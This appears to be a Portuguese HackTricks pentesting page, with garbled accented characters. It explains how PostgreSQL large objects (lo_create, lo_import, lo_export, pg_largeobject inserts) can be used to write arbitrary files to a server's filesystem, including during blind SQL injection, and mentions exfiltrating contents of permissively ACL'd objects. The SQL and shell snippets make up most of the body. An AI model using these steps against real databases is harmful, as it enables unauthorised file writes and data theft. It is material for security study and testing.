<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

### Objetos Grandes do PostgreSQL

O PostgreSQL oferece uma estrutura conhecida como **objetos grandes**, acess√≠veis atrav√©s da tabela `pg_largeobject`, projetada para armazenar tipos de dados grandes, como imagens ou documentos PDF. Esta abordagem √© vantajosa em rela√ß√£o √† fun√ß√£o `COPY TO`, pois permite a **exporta√ß√£o de dados de volta para o sistema de arquivos**, garantindo que uma r√©plica exata do arquivo original seja mantida.

Para **armazenar um arquivo completo** dentro desta tabela, um objeto deve ser criado na tabela `pg_largeobject` (identificado por um LOID), seguido pela inser√ß√£o de fragmentos de dados, cada um com 2KB de tamanho, neste objeto. √â crucial que esses fragmentos tenham exatamente 2KB de tamanho (com a poss√≠vel exce√ß√£o do √∫ltimo fragmento) para garantir que a fun√ß√£o de exporta√ß√£o seja executada corretamente.

Para **dividir seus dados bin√°rios** em fragmentos de 2KB, os seguintes comandos podem ser executados:
```bash
split -b 2048 your_file # Creates 2KB sized files
```
Para codificar cada arquivo em Base64 ou Hex, os comandos abaixo podem ser usados:
```bash
base64 -w 0 <Chunk_file> # Encodes in Base64 in one line
xxd -ps -c 99999999999 <Chunk_file> # Encodes in Hex in one line
```
**Importante**: Ao automatizar este processo, certifique-se de enviar peda√ßos de 2KB de bytes de texto simples. Arquivos codificados em hexadecimal exigir√£o 4KB de dados por peda√ßo devido ao dobro de tamanho, enquanto arquivos codificados em Base64 seguem a f√≥rmula `ceil(n / 3) * 4`.

O conte√∫do dos objetos grandes pode ser visualizado para fins de depura√ß√£o usando:
```sql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
#### Usando `lo_creat` & Base64

Para armazenar dados bin√°rios, primeiro √© criado um LOID:
```sql
SELECT lo_creat(-1);       -- Creates a new, empty large object
SELECT lo_create(173454);  -- Attempts to create a large object with a specific OID
```
Em situa√ß√µes que exigem controle preciso, como explorar uma Inje√ß√£o de SQL Blind, `lo_create` √© preferido para especificar um LOID fixo.

Os peda√ßos de dados podem ent√£o ser inseridos da seguinte forma:
```sql
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 1, decode('<B64 chunk2>', 'base64'));

```
Para exportar e potencialmente excluir o large object ap√≥s o uso:
```sql
SELECT lo_export(173454, '/tmp/your_file');
SELECT lo_unlink(173454);  -- Deletes the specified large object
```
#### Utilizando `lo_import` & Hex

A fun√ß√£o `lo_import` pode ser utilizada para criar e especificar um LOID para um objeto grande:
```sql
select lo_import('/path/to/file');
select lo_import('/path/to/file', 173454);
```
Ap√≥s a cria√ß√£o do objeto, os dados s√£o inseridos por p√°gina, garantindo que cada fragmento n√£o exceda 2KB:
```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
```
Para completar o processo, os dados s√£o exportados e o large object √© deletado:
```sql
select lo_export(173454, '/path/to/your_file');
select lo_unlink(173454);  -- Deletes the specified large object
```
### Limita√ß√µes

√â observado que **objetos grandes podem ter ACLs** (Listas de Controle de Acesso), potencialmente restringindo o acesso at√© mesmo a objetos criados pelo seu usu√°rio. No entanto, objetos mais antigos com ACLs permissivas ainda podem ser acess√≠veis para exfiltra√ß√£o de conte√∫do.

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
